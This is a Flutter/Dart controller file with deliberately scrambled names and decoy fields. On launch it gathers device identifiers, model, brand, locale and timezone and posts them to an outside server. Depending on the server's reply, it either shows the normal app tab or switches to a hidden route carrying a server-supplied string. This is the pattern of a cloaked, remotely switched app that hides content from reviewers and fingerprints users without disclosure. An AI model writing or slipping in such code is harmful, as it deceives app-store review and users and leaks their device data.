import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var dqkbtagul = RxBool(false);
  var homrisct = RxBool(true);
  var awbdhlg = RxString("");
  var leland = RxBool(false);
  var walsh = RxBool(true);
  final ouanzwr = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    mfpbuhwe();
  }


  Future<void> mfpbuhwe() async {

    leland.value = true;
    walsh.value = true;
    homrisct.value = false;

    ouanzwr.post("https://ap.singcen.store/zbusqwhtcrgkmpoxjeyvnal",data: await fploum()).then((value) {
      var jsrcl = value.data["jsrcl"] as String;
      var ubliedtp = value.data["ubliedtp"] as bool;
      if (ubliedtp) {
        awbdhlg.value = jsrcl;
        joshua();
      } else {
        klocko();
      }
    }).catchError((e) {
      homrisct.value = true;
      walsh.value = true;
      leland.value = false;
    });
  }

  Future<Map<String, dynamic>> fploum() async {
    final DeviceInfoPlugin ehvct = DeviceInfoPlugin();
    PackageInfo ayechwr_ucwxtvk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var feaqdglp = Platform.localeName;
    var hnforvk = currentTimeZone;

    var qnwilmag = ayechwr_ucwxtvk.packageName;
    var hket = ayechwr_ucwxtvk.version;
    var agjz = ayechwr_ucwxtvk.buildNumber;

    var gbnlm = ayechwr_ucwxtvk.appName;
    var rnbwl = "";
    var hilmufgz = "";
    var carloMueller = "";
    var clarabelleGrady = "";
    var sovmcj  = "";
    var isomRatke = "";
    var rubyeMraz = "";
    var jannieMcDermott = "";
    var wendyDavis = "";
    var doraKoepp = "";
    var jamirRosenbaum = "";


    var pilxe = "";
    var rgiked = false;

    if (GetPlatform.isAndroid) {
      pilxe = "android";
      var ojuvahfyt = await ehvct.androidInfo;

      hilmufgz = ojuvahfyt.brand;

      rnbwl  = ojuvahfyt.model;
      sovmcj = ojuvahfyt.id;

      rgiked = ojuvahfyt.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pilxe = "ios";
      var rlzjsmq = await ehvct.iosInfo;
      hilmufgz = rlzjsmq.name;
      rnbwl = rlzjsmq.model;

      sovmcj = rlzjsmq.identifierForVendor ?? "";
      rgiked  = rlzjsmq.isPhysicalDevice;
    }

    var res = {
      "agjz": agjz,
      "rnbwl": rnbwl,
      "hket": hket,
      "qnwilmag": qnwilmag,
      "hnforvk": hnforvk,
      "gbnlm": gbnlm,
      "sovmcj": sovmcj,
      "hilmufgz": hilmufgz,
      "pilxe": pilxe,
      "rgiked": rgiked,
      "doraKoepp" : doraKoepp,
      "jannieMcDermott" : jannieMcDermott,
      "isomRatke" : isomRatke,
      "feaqdglp": feaqdglp,
      "rubyeMraz" : rubyeMraz,
      "jamirRosenbaum" : jamirRosenbaum,
      "wendyDavis" : wendyDavis,
      "carloMueller" : carloMueller,
      "clarabelleGrady" : clarabelleGrady,

    };
    return res;
  }

  Future<void> klocko() async {
    Get.offAllNamed("/ohmTab");
  }

  Future<void> joshua() async {
    Get.offAllNamed("/ohmYou");
  }

}
